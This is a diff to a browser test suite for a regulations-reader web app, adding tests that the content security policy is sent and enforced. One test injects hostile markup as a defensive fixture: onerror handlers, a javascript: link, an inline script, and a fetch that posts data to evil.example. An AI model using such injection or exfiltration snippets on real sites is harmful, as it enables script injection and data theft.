@@ -46,7 +46,7 @@ from app import config, news_store, news_worker
 from app.routers import news as news_api
 from app.main import app
 from fake_titles import FakeTitles
-from tests.base import TRACKED_KEYS
+from tests.base import TRACKED_KEYS, watch_policy_violations
 from tests.test_api_snapshots import seed_news
 
 BASELINE_ROOT = Path(__file__).resolve().parent / "baselines"
@@ -193,6 +193,8 @@ class BrowserCase(unittest.TestCase):
         self.context = ENV.browser.new_context(
             viewport=self.viewport, device_scale_factor=1, reduced_motion="reduce")
         self.addCleanup(self.context.close)
+        # Every test in this file also proves its screens stay inside the content security policy.
+        self.policy_violations = watch_policy_violations(self, self.context)
         self.external: list[str] = []
 
         def router(route):
@@ -919,6 +921,88 @@ class BehaviorTests(BrowserCase):
         page.wait_for_selector(".lib-row", timeout=10000)
         self.assertEqual(page.evaluate("location.hash"), "#/library/cfr/29")
         self.assert_no_external_requests()
+
+
+class ContentSecurityPolicyTests(BrowserCase):
+    """SEC-003: the policy app/security.py sends is enforced by the browser, and the app's own
+    screens never trip it."""
+
+    RECORD = """
+      window.__csp = [];
+      document.addEventListener('securitypolicyviolation', e =>
+        window.__csp.push(e.effectiveDirective + ' ' + e.blockedURI));
+    """
+    SCREENS = (                                   # (route, ready selector)
+        ("/", ".hm-titles[data-snapshot-loaded='1']"),                 # Home
+        ("/section/1910.1200", "#view-head"),                          # a section, clause by clause
+        ("/section/1910.1200/full", ".reg-figure"),                    # the same section in full, with its figure
+        ("/library", "#lib-tabs"),
+        ("/news", "#news-q"),
+        ("/search?q=hazard&scope=all", ".search-view-toggle button"),
+        ("/settings", "[data-open-env]"),
+    )
+
+    def setUp(self):
+        super().setUp()
+        self.context.add_init_script(self.RECORD)
+
+    def test_the_main_screens_stay_inside_the_policy(self):
+        from app import security
+        for route, ready in self.SCREENS:
+            with self.subTest(route=route):
+                page = self.context.new_page()
+                page.clock.set_fixed_time(FROZEN)
+                response = page.goto(f"{ENV.base_url}/#{route}")
+                headers = response.headers
+                self.assertEqual(headers["content-security-policy"], security.content_security_policy())
+                self.assertEqual(headers["x-content-type-options"], "nosniff")
+                self.assertEqual(headers["x-frame-options"], "DENY")
+                self.assertEqual(headers["referrer-policy"], "same-origin")
+                page.wait_for_selector(ready, timeout=15000, state="attached")
+                if ready == ".reg-figure":
+                    # The figure loads lazily; once its request fails (this suite aborts it) the
+                    # reader swaps the image for a link to eCFR.
+                    page.locator(ready).first.scroll_into_view_if_needed()
+                    page.wait_for_selector(".reg-figure:not(:has(img))", timeout=15000, state="attached")
+                page.wait_for_load_state("networkidle")
+                self.assertEqual(page.evaluate("window.__csp"), [])
+                # The inline pre-paint script ran (allowed by its hash): it sets these two.
+                self.assertTrue(page.evaluate("document.documentElement.dataset.motion"))
+                self.assertEqual(
+                    page.evaluate("document.documentElement.style.getPropertyValue('--reader-size')"), "16px")
+                page.close()
+        self.assertEqual(self.policy_violations, [])
+        # The one outside host the policy allows is the figure host; the request left the page
+        # (and was stopped by this suite's router, like every non-local request).
+        self.assertTrue(self.external and all(u.startswith("https://img.federalregister.gov/") for u in self.external),
+                        self.external)
+
+    def test_injected_markup_cannot_run_or_phone_home(self):
+        """What the policy is for: if escaping ever fails and hostile markup reaches innerHTML,
+        its handler does not run and nothing is loaded from, or sent to, another host."""
+        page = self.open_page("/settings", "[data-open-env]")
+        blocked = page.evaluate("""async () => {
+          const box = document.createElement('div');
+          box.innerHTML = '<img src="https://evil.example/x.png" onerror="window.__ran = 1">'
+            + '<img src="/static/missing.png" onerror="window.__ran = 2">'
+            + '<a id="js-link" href="javascript:window.__ran = 3">x</a>';
+          document.body.appendChild(box);
+          const s = document.createElement('script');
+          s.textContent = 'window.__ran = 4';
+          document.body.appendChild(s);
+          document.getElementById('js-link').click();
+          let sent = 'sent';
+          try { await fetch('https://evil.example/collect', {method: 'POST', body: 'notes'}); } catch (e) { sent = 'refused'; }
+          await new Promise(r => setTimeout(r, 300));
+          return {ran: window.__ran === undefined ? null : window.__ran, sent, seen: window.__csp};
+        }""")
+        self.assertIsNone(blocked["ran"])
+        self.assertEqual(blocked["sent"], "refused")
+        directives = {v.split(" ")[0] for v in blocked["seen"]}
+        self.assertLessEqual({"img-src", "script-src-attr", "script-src-elem", "connect-src"}, directives, blocked["seen"])
+        self.assertEqual(self.external, [], "a refused request still left the browser")
+        self.assertTrue(self.policy_violations)      # the watcher saw them too ...
+        self.policy_violations.clear()               # ... and these were the point of the test
 
 
 class ScreenshotCase(BrowserCase):
